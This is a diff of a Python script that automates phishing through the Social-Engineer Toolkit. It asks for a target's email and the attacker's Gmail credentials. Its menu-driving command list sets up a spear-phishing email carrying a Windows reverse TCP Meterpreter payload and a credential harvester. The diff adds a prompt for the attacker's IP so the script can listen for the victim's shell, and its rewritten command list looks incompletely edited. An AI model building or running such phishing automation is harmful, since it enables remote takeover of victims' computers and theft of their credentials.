@@ -2,6 +2,7 @@ import subprocess
 
 option = input("Do you want to phish using 1. email, 2. phone nr. or 3. clone page?: ")
 if option == "1":
+    ip = input("your ip to listen to the shell: ")
     targetmail = input("Mail of target?: ")
     mail = input("Your Gmail?: ")
     password = input("Gmail password?: ")
@@ -10,22 +11,14 @@ if option == "1":
     process = subprocess.Popen(['sudo', 'setoolkit'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
     commands = [
-        "1\n",  # Social-Engineering Attacks
-        "1\n",  # Spear-Phishing Attack Vectors
-        "1\n",  # Perform a Mass Email Attack
-        "1\n",  # E-Mail Attack Single Email Address
-        "16\n",  # Create a FileFormat Payload
-        "\n",  # Use the file created
-        "2\n",  # Social-Engineering Templates
-        f"{filename}\n",  # Name of the file to save the email
-        "1\n",  # Windows Reverse TCP Meterpreter
-        "1\n",  # Use default Windows reverse TCP shellcode
-        "3\n",  # Credential Harvester Attack Method
-        f"{targetmail}\n",  # Target email address
-        "1\n",  # Send Email to: Target email address
-        f"{mail}\n",  # Sender email address
-        f"{password}\n",  # Sender email password
-        "yes\n"  # Confirm to send email
+        "1\n",
+        "1\n",
+        "1\n",
+        "13\n",
+        "2\n",
+        "1\n",
+        ip,
+                
     ]
 
     for command in commands:
